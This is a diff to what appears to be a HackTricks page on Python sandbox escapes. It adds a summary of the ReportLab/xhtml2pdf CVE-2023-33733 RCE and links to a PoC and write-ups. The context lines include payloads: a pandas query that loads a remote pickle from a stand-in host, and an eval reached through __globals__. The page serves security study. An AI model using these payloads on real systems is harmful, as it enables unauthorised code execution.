@@ -136,6 +136,14 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
 
+Also see a real-world sandboxed evaluator escape in PDF generators:
+
+- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). It abuses rl_safe_eval to reach function.__globals__ and os.system from evaluated attributes (for example, font color) and returns a valid value to keep rendering stable.
+
+{{#ref}}
+reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
+{{#endref}}
+
 ## Operators and short tricks
 
 ```python
@@ -1147,5 +1155,8 @@ will be bypassed
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
+- [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
+- [c53elyas/CVE-2023-33733 PoC and write-up](https://github.com/c53elyas/CVE-2023-33733)
+- [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
